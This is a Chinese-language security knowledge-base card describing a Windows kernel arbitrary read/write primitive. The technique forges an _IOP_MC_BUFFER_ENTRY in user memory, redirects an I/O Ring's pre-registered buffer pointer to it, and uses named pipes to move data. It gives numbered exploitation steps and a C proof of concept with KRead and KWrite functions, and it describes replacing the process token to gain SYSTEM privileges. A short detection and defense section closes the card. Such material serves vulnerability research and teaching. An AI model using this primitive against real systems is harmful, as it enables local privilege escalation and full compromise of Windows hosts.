---
id: binary-pwn-kernel-windows-io-ring-pipe-arbitrary-rw
title: Windows I/O Ring + 命名管道任意读写：伪造 IOP_MC_BUFFER_ENTRY 并篡改预注册缓冲区指针
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-io-ring-pipe-arbitrary-read-write
aliases:
- I/O Ring 任意读写
- IOP_MC_BUFFER_ENTRY
- IoRingBufferRefFromIndexAndOffset
- BuildIoRingWriteFile
- BuildIoRingReadFile
- Windows 内核任意地址读写
tags:
- windows
- kernel
- pwn
- io-ring
- named-pipe
- arbitrary-read
- arbitrary-write
- iop-mc-buffer-entry
- lpe
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:37:32+08:00'
  notes: 已对照原文与图65/66核对：_IOP_MC_BUFFER_ENTRY 0x80 布局、Type=0xc02/Size=0x80/RefCount>=1/AccessMode=1、KRead BuildIoRingWriteFile+ReadFile、KWrite BuildIoRingReadFile、RegBufferArray[0] 指向用户态伪造条目均一致；未在本机复跑
---

## 一句话结论

若攻击者能改写某个 I/O Ring 的预注册缓冲区指针数组（`RegBufferArray[0]`），使其指向用户态伪造的 `_IOP_MC_BUFFER_ENTRY`，就可借 `BuildIoRingWriteFile` 把任意内核地址的内容写入命名管道（任意读），再用 `BuildIoRingReadFile` 把管道数据写入任意内核地址（任意写），从而获得稳定的内核任意读写原语。

## 原理

- **I/O Ring 预注册缓冲区**：`CreateIoRing(IORING_VERSION_3, ...)` 创建 I/O Ring；`BuildIoRingRegisterBuffers(h, N, buffers, 0)` 把 N 个用户缓冲区登记到内核，内核在分页池分配一个指针数组（每项指向 `_IOP_MC_BUFFER_ENTRY`），块布局为 `POOL_HEADER(0x10) + N×8`；8 个指针正好 0x50，与常见池块对齐。
- **伪造条目**：`_IOP_MC_BUFFER_ENTRY` 大小 0x80，关键字段：`Type=0xc02`（用户态映射的预注册缓冲区）、`Size=0x80`、`ReferenceCount>=1`、`AccessMode=1`（KernelMode）、`Address`（目标内核地址）、`Length`（读写长度）。正常条目由内核分配，但 I/O Ring 只按指针解引用；把指针数组项改成用户态地址也能工作（原文验证成功）。
- **任意读**：把伪造条目的 `Address` 设为目标内核地址、`Length=size`；构造 `BuildIoRingWriteFile(ring, IoRingHandleRefFromHandle(outputClientPipe), IoRingBufferRefFromIndexAndOffset(0,0), size, ...)` 的 SQE，提交后内核从“预注册缓冲区 0”读取 `size` 字节写入管道客户端；用户态用 `ReadFile(outputPipe, ...)` 从管道服务端读出，即得到目标地址内容。
- **任意写**：先把要写的值 `WriteFile(inputPipe, pValue, size)` 放进管道内核缓冲区；把伪造条目 `Address` 设为目标地址；构造 `BuildIoRingReadFile(ring, IoRingHandleRefFromHandle(inputClientPipe), IoRingBufferRefFromIndexAndOffset(0,0), size, ...)`，提交后内核从管道读取数据并写入 `Address` 指向的内核地址。
- **两个引用宏**：`IoRingBufferRefFromIndexAndOffset(Index, Offset) = (Index<<32)|Offset` 指定第 Index 个预注册缓冲区及偏移；`IoRingHandleRefFromHandle(Handle)` 把普通句柄转成 I/O Ring 的注册句柄引用。两者共同决定 SQE 的源/目标。
- **定位目标 Ring**：原文把预注册缓冲区数据初始化为 `0x41`（'A'），篡改指针后遍历所有 I/O Ring 逐个尝试 `KRead(file_object_ptr)`；返回不是 `0x41414141...` 的那个 Ring 就是预注册指针已被改写的目标。
- **前提**：需要一个能改写内核池中 `RegBufferArray` 的漏洞（本例是 vkrnlintvsp.sys 池溢出 + WNF 挖洞），以及大量 I/O Ring/命名管道做布局；普通用户即可调用这些 API。

## 触发条件

- Windows 11（I/O Ring API 可用）且目标进程可创建 I/O Ring 与命名管道。
- 存在可写内核池指针数组的漏洞（池溢出、UAF、任意写原语），能把某个 `RegBufferArray[0]` 改成用户态地址。
- 攻击者能在用户态分配并锁定一块内存作为伪造 `_IOP_MC_BUFFER_ENTRY`（示例 `VirtualAlloc(0x5000)` + `VirtualLock`，指针偏移 0x3000 防止踩页边界）。
- 目标地址可读/可写，管道句柄与 I/O Ring 句柄有效；`Type=0xc02`、`AccessMode=1`、`RefCount>=1` 等字段设置正确。
- 目标未阻止用户态地址作为 I/O Ring 缓冲区条目（或该检查可绕过）。

## 利用步骤

1. 创建 0x500 个 I/O Ring（`CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, &h)`），每个用 `BuildIoRingRegisterBuffers` 注册 8 个缓冲区，构造 0x50 池块；先不提交 SQE。
2. 创建输出/输入两个命名管道（服务端 + 客户端），用于承载读写数据。
3. 在用户态分配并锁定伪造条目内存，初始化 0x80 字节的 `_IOP_MC_BUFFER_ENTRY`：`Type=0xc02`、`Size=0x80`、`ReferenceCount=1`、`AccessMode=1`。
4. 用漏洞改写某个 I/O Ring 的 `RegBufferArray[0]` 指向伪造条目；若无法直接定位，遍历所有 Ring 用 `KRead` 试读并筛选。
5. 任意读：设置 `Address=target`、`Length=size`，`BuildIoRingWriteFile` + `SubmitIoRing` + `PopIoRingCompletion`，再 `ReadFile(outputPipe, pOut, size)`。
6. 任意写：`WriteFile(inputPipe, pValue, size)`，设置 `Address=target`，`BuildIoRingReadFile` + `SubmitIoRing`，目标地址即被覆盖。
7. 用任意读泄露 FileObject/DriverObject/ntoskrnl 基址，任意写替换 EPROCESS token（见 CVE-2025-21333 主卡）。

## PoC

```c
// 伪造条目（0x80 字节）
typedef struct _IOP_MC_BUFFER_ENTRY {
    USHORT Type;            // 0x00 = 0xc02
    USHORT Reserved;        // 0x02
    ULONG  Size;            // 0x04 = 0x80
    LONG   ReferenceCount;  // 0x08 >= 1
    ULONG  Flags;           // 0x0c
    LIST_ENTRY GlobalDataLink; // 0x10
    PVOID  Address;         // 0x20 目标内核地址
    ULONG  Length;          // 0x28
    CHAR   AccessMode;      // 0x2c = 1 (KernelMode)
    LONG   MdlRef;          // 0x30
    PVOID  Mdl;             // 0x38
    KEVENT MdlRundownEvent; // 0x40
    ULONGLONG* PfnArray;    // 0x58
    BYTE   PageNodes[0x20]; // 0x60
} IOP_MC_BUFFER_ENTRY;

BOOL KRead(PVOID target, PBYTE out, SIZE_T size) {
    memset(fake, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake->Address = target;
    fake->Length = size;
    fake->Type = 0xc02;
    fake->Size = 0x80;
    fake->AccessMode = 1;
    fake->ReferenceCount = 1;

    auto bufRef = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto fileRef = IoRingHandleRefFromHandle(outputClientPipe);
    BuildIoRingWriteFile(ring, fileRef, bufRef, size, 0,
                         FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    SubmitIoRing(ring, 1, INFINITE, &submitted);
    PopIoRingCompletion(ring, &cqe);
    return ReadFile(outputPipe, out, size, &bytesRead, NULL);
}

BOOL KWrite(PVOID target, PBYTE value, SIZE_T size) {
    WriteFile(inputPipe, value, size, &bytesWritten, NULL);
    memset(fake, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake->Address = target;
    fake->Length = size;
    fake->Type = 0xc02;
    fake->Size = 0x80;
    fake->AccessMode = 1;
    fake->ReferenceCount = 1;

    auto bufRef = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto fileRef = IoRingHandleRefFromHandle(inputClientPipe);
    BuildIoRingReadFile(ring, fileRef, bufRef, size, 0, NULL, IOSQE_FLAGS_NONE);
    SubmitIoRing(ring, 1, INFINITE, &submitted);
    return TRUE;
}
```

原文在 CVE-2025-21333 利用中通过该原语读取 `FileObject/DriverObject/NpFsdCreate` 并替换 token，`whoami` 变为 `nt authority\system`；PoC 未在本机复跑。

## 变体与关联

- 指针数组定位变体：可用池溢出、UAF、任意写直接改 `RegBufferArray`；也可用其他内核指针数组对象（如管道 Attribute、注册表）承载伪造条目。
- 条目类型变体：`Type=0xc02` 表示用户态映射预注册缓冲区；不同 Windows 版本/类型字段可能变化，需逆向确认。
- 关联：[[binary-pwn-kernel-cve-2025-21333-vkrnlintvsp-dacl-truncation-pool-overflow]]（本原语的取得方式）、[[binary-pwn-kernel-windows-wnf-paged-pool-spray-hole-digging]]（池布局）、[[binary-pwn-kernel-windows-pipe-attribute-np-ccb-kaslr-leak]]（KASLR 泄露）。
- 边界：若目标阻止用户态指针作为条目、I/O Ring 版本不支持 `IORING_VERSION_3`、或无法改写指针数组，则原语不可用。

## 检测与防御

- 检测：大量 `CreateIoRing`/`BuildIoRingRegisterBuffers` 调用；预注册缓冲区指针指向用户态地址；`_IOP_MC_BUFFER_ENTRY` 出现在用户内存且 `Type=0xc02`；异常管道读写与内核地址访问。
- 防御：I/O Ring 内核应校验条目指针位于内核池且属于已注册缓冲区；限制普通用户创建大量 I/O Ring；启用内核池硬化/HVCI；监控异常池篡改。
- 加固：对 `RegBufferArray` 做完整性保护；禁止用户态地址作为 `IOP_MC_BUFFER_ENTRY`；及时安装相关补丁。
